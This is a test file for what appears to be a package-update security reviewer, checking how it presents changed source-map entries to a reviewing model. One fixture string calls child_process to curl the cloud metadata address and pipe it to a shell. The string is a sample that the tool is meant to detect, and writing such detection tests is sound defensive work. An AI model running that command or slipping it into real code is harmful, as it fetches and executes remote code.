import { test, expect } from "bun:test";
import { reviewUpdate } from "../src/review.ts";
import type { FileMap } from "../src/prepass.ts";
const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const HIT = "require('child_process').exec('curl http://169.254.169.254/ | sh')";
const CLEAN = "export function totallyOrdinaryHelper(x: number) {\n  return x * 41 + 1;\n}\n";
const pad = (seed: string) => ("AAAA" + seed + "CAAO,aAAP,OAAO,uBAAP;").repeat(250_000);
const map = (seed: string, a: string, b: string) => JSON.stringify({ version: 3, file: "index.js", sources: ["../src/a.ts", "../src/b.ts"], names: [], sourcesContent: [a, b], mappings: pad(seed) });

test("a padded strings-hit map shows a matching changed entry in full and a clean changed entry as one hash line", async () => {
  const reviewed: string[] = [];
  await reviewUpdate({
    eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
    registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
    advisories: { query: async () => [] },
    reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
    cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), chunkChars: 60000,
    loadArtifacts: async () => ({
      old: files({ "package.json": '{"name":"lib","version":"a","main":"lib/index.js"}', "lib/index.js": "exports.v = 1;\n", "lib/index.js.map": map("a", "old a\n", "old b\n") }),
      new: files({ "package.json": '{"name":"lib","version":"b","main":"lib/index.js"}', "lib/index.js": "exports.v = 2;\n", "lib/index.js.map": map("b", HIT, CLEAN) }),
    }),
  });
  const all = reviewed.join("");
  expect(all).toContain("169.254.169.254");
  expect(all).not.toContain("totallyOrdinaryHelper");
  expect(all).toMatch(/sourcesContent \.\.\/src\/b\.ts \(changed\) ===\n\| \[source text, 74 bytes, sha256 [0-9a-f]{64}\]/);
}, 60000);
